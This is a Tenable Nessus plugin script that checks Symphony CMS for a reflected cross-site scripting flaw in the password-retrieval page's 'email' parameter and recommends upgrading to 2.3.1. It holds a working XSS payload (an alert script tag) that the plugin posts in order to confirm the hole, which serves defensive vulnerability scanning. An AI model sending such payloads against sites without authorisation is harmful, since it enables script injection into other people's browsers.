#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62813);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/05/19 18:02:20 $");

  script_bugtraq_id(56094);
  script_osvdb_id(86404);
  script_xref(name:"EDB-ID", value:"22039");

  script_name(english:"Symphony Password Retrieval Script XSS");
  script_summary(english:"Checks for cross-site scripting vulnerability");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host is running a web application affected by a cross-site
scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running a version of Symphony that is affected
by a cross-site scripting vulnerability. The 'email' parameter of the
'/symphony/login/retrieve-password/' script is not properly sanitized,
and may allow an attacker to execute arbitrary script code in the
browser of an unsuspecting user. 

This version of Symphony may also be affected by other XSS and SQL
injection vulnerabilities although Nessus has not tested for these 
additional issues."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.justanotherhacker.com/advisories/JAHx122.txt");
  script_set_attribute(attribute:"see_also", value:"http://github.com/symphonycms/symphony-2");
  script_set_attribute(attribute:"see_also", value:"http://getsymphony.com/download/releases/version/2.3.1/");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to Symphony 2.3.1 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/10/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/09/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:symphony-cms:symphony_cms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("symphony_cms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/symphony");
 
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

appname = "Symphony";

install = get_install_from_kb(
  appname      : 'symphony', 
  port         : port, 
  exit_on_fail : TRUE
);

dir = install['dir'];
install_url = build_url(port:port, qs:dir);

vuln_script = '/symphony/login/retrieve-password/';

xss_exploit = '"><script>alert(\'' + SCRIPT_NAME + '|' + unixtime() +
          '\');</script><a href="';

postdata = 'email=' + urlencode(str:xss_exploit);

res = http_send_recv3(method       : "POST", 
                      port         : port,
                      item         : vuln_script,
                      data         : postdata,
                      content_type : "application/x-www-form-urlencoded",
                      exit_on_fail : TRUE);

if (
  'value="' + xss_exploit + '" autofocus="autofocus">' >< res[2] &&
  '<h1>Symphony</h1>' >< res[2] &&
  'Send Email' >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    report = 
    '\nNessus was able to exploit the vulnerability with the following' +  
    '\nPOST request :\n' +
    '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
    chomp(http_last_sent_request()) +
    '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  
    security_warning(port:port, extra:report); 
  }
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
